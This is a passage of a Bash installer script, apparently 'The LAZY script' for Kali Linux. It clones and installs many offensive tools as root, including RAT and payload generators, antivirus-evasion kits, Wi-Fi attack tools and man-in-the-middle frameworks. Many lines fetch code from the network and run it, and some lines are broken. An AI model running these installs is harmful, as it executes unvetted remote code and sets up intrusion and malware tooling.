			rm -r /root/anonym8
		fi		
		echo -e "Installing Anonym8"
		echo -e "Tool by HiroshiManRise"
		git clone https://github.com/HiroshiManRise/anonym8.git
		cd anonym8
		chmod +x INSTALL.sh
		./INSTALL.sh
		sleep 1	
		cd
	}
	function install_thefatrat
	{
		if [[ -d "/root/TheFatRat" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/TheFatRat
		fi	
		echo -e "Installing TheFatRat"
		echo -e "Tool by Screetsec"
		cd
		git clone https://github.com/Screetsec/TheFatRat.git
		cd TheFatRat
		chmod +x setup.sh && ./setup.sh	
		cd
	}
	function install_angryip
	{
		cd
		if [[ -f "/root/ipscan_*" ]]
		then
			echo -e "Removing old file"
			sleep 2
			rm -f /root/ipscan_*
		fi
		echo -e "Downloading angryipscanner"
		sleep 2
		wget https://github.com/angryip/ipscan/releases/download/3.5.1/ipscan_3.5.1_amd64.deb
		echo -e "Installing..."
		dpkg -i ipscan_*
		echo -e "Done"
		sleep 1
	}
	function install_sniper
	{
		if [[ -d /root/Sn1per ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Sn1per
		fi
		echo -e "Installing Sn1per"
		echo -e "Tool by 1N3"
		cd
		git clone https://github.com/1N3/Sn1per.git
		cd /root/Sn1per
		chmod +x install.sh
		./install.sh
		cd
	}
	function install_recondog
	{
		if [[ -d /root/ReconDog ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ReconDog
		fi
		cd
		echo -e "Installing ReconDog"
		echo -e "Tool by UltimateHackers"
		git clone https://github.com/UltimateHackers/ReconDog.git
	}
	function install_redhawk
	{
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/RED_HAWK
		fi
		cd
		echo -e "Installing RED HAWK"
		echo -e "Tool by Tuhinshubhra"
		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
	}
	function install_winpayloads
	{
		if [[ -d /root/Winpayloads ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Winpayloads
		fi
		cd
		echo -e "Installing Winpayloads"
		echo -e "Tool by Nccgroup"
		git clone https://github.com/nccgroup/Winpayloads.git
		cd /root/Winpayloads
		chmod +x setup.sh
		./setup.sh
		cd
	}
	function install_chaos
	{
		apt install golang upx-ucl -y
		cd
		if [[ -d /root/CHAOS ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/CHAOS
		fi
		git clone https://github.com/tiagorlampert/CHAOS.git
	}
	function install_routersploit
	{
		if [[ -d /root/routersploit ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/routersploit
		fi
		cd
		echo -e "Installing routersploit"
		echo -e "Tool by reverse-shell"
		git clone https://github.com/reverse-shell/routersploit
		cd /root/routersploit
		pip install -r requirements.txt
		cd
	}
	function install_infoga
	{
		if [[ -d /root/Infoga ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Infoga
		fi
		git clone https://github.com/m4ll0k/Infoga.git
		cd /root/Infoga
		pip install -r requirements.txt
		cd
	}
	function install_nwatch
	{
		if [[ -d /root/nWatch ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/nWatch
		fi
		cd
		echo -e "Installing nWatch"
		echo -e "Tool by Suraj"
		git clone https://github.com/suraj-root/nWatch.gi
		pip install scapy
		pip install colorama
		pip install nmap
		pip install ctypes
		pip2.7 install scapy
		pip2.7 install colorama
		pip2.7 install nmap
		pip2.7 install ctypes
	}
	function install_eternalscanner
	{
		if [[ -d /root/eternal_scanner ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/eternal_scanner
		fi
		cd
		echo -e "Installing eternal_scanner"
		echo -e "Tool by Peterpt"
		git clone https://github.com/peterpt/eternal_scanner.git
		apt-get install -y masscan metasploit-framework
	}
	function install_eaphammer
	{
		if [[ -d /root/eaphammer ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/eaphammer
		fi
		cd
		echo -e "Installing eaphammer"
		echo -e "Tool by s0lst1c3"
		git clone https://github.com/s0lst1c3/eaphammer
		cd eaphammer
		chmod +x kali-setup
		./kali-setup
		cd
		clear
		apt-get install -y python-tqdm
	}
	function install_dagon
	{
		if [[ -d /root/dagon ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/dagon
		fi
		cd
		echo -e "Installing Dagon"
		echo -e "Tool by Ekultek"
		git clone https://github.com/ekultek/dagon.git
		cd dagon
		pip install -r requirements.txt
		pip2.7 install -r requirements.txt
		apt-get install -y bcrypt
		cd
	}
	function install_lalin
	{
		if [[ -d /root/LALIN ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/LALIN
		fi
		cd
		echo -e "Installing Lalin"
		echo -e "Tool by Edo -maland-"
		git clone https://github.com/Screetsec/LALIN.git
		cd LALIN
		chmod +x Lalin.sh
		cd
	}
	function install_knockmail
	{
		if [[ -d /root/KnockMail ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/KnockMail
		fi
		cd
		echo -e "Installing KnockMail"
		echo -e "Tool by 4w4k3"
		git clone https://github.com/4w4k3/KnockMail.git
		cd KnockMail
		pip install -r requeriments.txt
		cd
	}
	function install_kwetza
	{
		if [[ -d /root/kwetza ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kwetza
		fi
		cd
		echo -e "Installing Kwetza"
		echo -e "Tool by Sensepost"
		https://github.com/sensepost/kwetza.git
		pip install beautifulsoup4
		pip2.7 install beautifulsoup4
	}
	function install_ngrok
	{
		if [[ -f /root/ngrok || -f /root/ngrok.zip ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -f /root/ngrok
			rm -f /root/ngrok.zip
		fi
		rm -f /root/ngrok.zip
		cd
		echo -e "Downloading Ngrok"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip
		echo -e "Unzipping Ngrok"
		unzip /root/ngrok.zip
	}
	function install_netdiscover
	{
		apt-get install -y netdiscover	
	}
	function install_websploit
	{
		apt-get install -y websploit
	}
	function install_openvas
	{
		apt-get install -y openvas
		openvas-setup
	}
	function install_shellter
	{
		apt-get install -y shellter
		sleep 2
	}
	function install_geany
	{
		apt-get install -y geany
	}
	function install_bleachbit
	{
		apt-get install -y bleachbit
	}
	function install_vmr
	{
		if [[ -d /root/mdk3-v6 || -d /root/VMR ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/mdk3-v6
			if [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]
			then
				rm /root/VMR-MDK-K2-2017R-012x2.zip
			fi
			if [[ -d /root/VMR ]]
			then
				rm -r /root/VMR
			fi
		fi
		cd
		wget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip
		unzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR
		cp -r /root/VMR/mdk3-v6 /root/
		cd /root/mdk3-v6
		make
		make install
		chmod 755 /root/mdk3-v6/*
		chmod +x /root/VMR/*.sh
		cd
	}
	function install_hashbuster
	{
		if [[ -d /root/Hash-Buster ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Hash-Buster
		fi
		cd
		git clone https://github.com/UltimateHackers/Hash-Buster.git
		
	}
	function install_findsploit
	{
		if [[ -d /root/Findsploit ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Findsploit
		fi
		cd
		git clone https://github.com/1N3/Findsploit.git
		cd /root/Findsploit
		chmod +x install.sh
		./install.sh
		cd
	}
	function install_howdoi
	{
		pip install howdoi
		pip2.7 install howdoi
	}
	function install_operative
	{
		if [[ -d /root/operative-framework ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/oparative-framework
		fi
		cd
		git clone https://github.com/graniet/operative-framework.git
		cd /root/operative-framework
		pip install -r requirements.txt
		pip2.7 install -r requirements.txt
	}
	function install_netattack2
	{
		if [[ -d "/root/netattack2" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/netattack2
		fi
		cd
		git clone https://github.com/chrizator/netattack2.git
	}
	function install_koadic
	{
		foldname="koadic"
		gitlink="https://github.com/zerosum0x0/koadic.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		pip install -r requirements.txt
		pip2.7 install -r requirements.txt
		cd
	}
	function install_empire
	{
		foldname="Empire"
		gitlink="https://github.com/EmpireProject/Empire.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		chmod +x setup/install.sh
		cd setup
		./install.sh
		./setup_database.py
	}
	function install_meterpreter_paranoid_mode
	{
		foldname="Meterpreter_Paranoid_Mode-SSL"
		gitlink="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
	}
	function install_dropit_frmw
	{
		foldname="Dr0p1t-Framework"
		gitlink="https://github.com/D4Vinci/Dr0p1t-Framework.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		chmod 777 -R Dr0p1t-Framework
		cd Dr0p1t-Framework
		chmod +x install.sh
		./install.sh	
		#python Dr0p1t.py
	}
	function install_wifi_pumpkin
	{
		foldname="WiFi-Pumpkin"
		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		./installer.sh --install
	}
	function install_veil
	{
		foldname="Veil"
		gitlink="https://github.com/Veil-Framework/Veil.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		cd setup
		./setup.sh -c
		cd
	}
	function install_leviathan
	{
		foldname="leviathan"
		gitlink="https://github.com/leviathan-framework/leviathan.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		pip install -r requirements
		
		pip2.7 install -r requirements
		cd
	}
	function install_fake_image
	{
		foldname="FakeImageExploiter"
		gitlink="https://github.com/r00t-3xp10it/FakeImageExploiter.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
		chmod +x *.sh
	}
	function install_avet
	{
		foldname="avet"
		gitlink="https://github.com/govolution/avet.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd /root/$foldname
	}
	function install_gloom
	{
		foldname="Gloom-Framework"
		gitlink="https://github.com/joshDelta/Gloom-Framework.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd $foldname
		python install.py
	}
	function install_arcanus
	{
		foldname="ARCANUS"
		gitlink="https://github.com/EgeBalci/ARCANUS.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		#~ cd $foldname
	}
	function install_msfpc
	{
		apt-get install -y msfpc
	}
	function install_morphhta
	{
		foldname="morphHTA"
		gitlink="https://github.com/vysec/morphHTA.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
	}
	function install_lfi
	{
		foldname="LFISuite"
		gitlink="https://github.com/D35m0nd142/LFISuite.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
	}
	function install_unibyav
	{
		foldname="UniByAv"
		gitlink="https://github.com/Mr-Un1k0d3r/UniByAv.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		apt-get install -y mingw-w64
	}
	function install_demiguise
	{
		foldname="demiguise"
		gitlink="https://github.com/nccgroup/demiguise.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
	}
	function install_dkmc
	{
		foldname="DKMC"
		gitlink="https://github.com/Mr-Un1k0d3r/DKMC.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
	}
	function install_sechub
	{
		foldname="secHub"
		gitlink="https://github.com/joshDelta/secHub.git"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd $foldname
		python installer.py
		chmod +x /usr/bin/sechub
	}
	function install_beef
	{
		apt-get install beef-xss
	}
	function install_mitmf
	{
		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
		foldname="MITMf"
		gitlink="https://github.com/byt3bl33d3r/MITMf"
		if [[ "$foldname" = "" ]]
		then
			exit
		fi
		if [[ -d "/root/"$foldname"" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/"$foldname"
		fi
		cd
		git clone $gitlink
		cd $foldname
		git submodule init
		git submodule update --recursive
		pip install -r requirements.txt
		pip2.7 install -r requirements.txt
	}
	function install_arp_scan
	{
		apt-get -y install arp-scan
	}
	
		
#------------------------------------
####################################
defaults_l
printf '\033]2;The LAZY script\a'
if [[ "$ONETIMEPERLAUNCH" != "1" ]]
then
	one_time_per_launch_ks
fi
####################################
if [[ -f ""$LPATH"/IAGREE.txt" ]]
then

	if [[ ! -f ""$LPATH"/wlan.txt" ]]
	then
		set_interface_number
	fi
	if [[ ! -f ""$LPATH"/wlanmon.txt" ]]
	then
		set_interface_number
	fi
	if [[ ! -f ""$LPATH"/eth.txt" ]]
	then
		set_interface_number
	fi
	clear
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	WLANN=$(cat "$LPATH"/wlan.txt)
	ETH=$(cat "$LPATH"/eth.txt)	
	export WLANNM
	export WLANN
	export ETH
	managed_spaces
	monitor_spaces
	if [[ ! -f "$LPATH"/latestchangelog.txt ]]
	then
		echo -e "1" > "$LPATH"/latestchangelog.txt
		latest_changelog
	fi		
	banner
	main_options
	if [[ "$BACKL" = "1" ]]
	then
		exec bash "$0"
		
	else
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi
else
	terms_of_use
fi
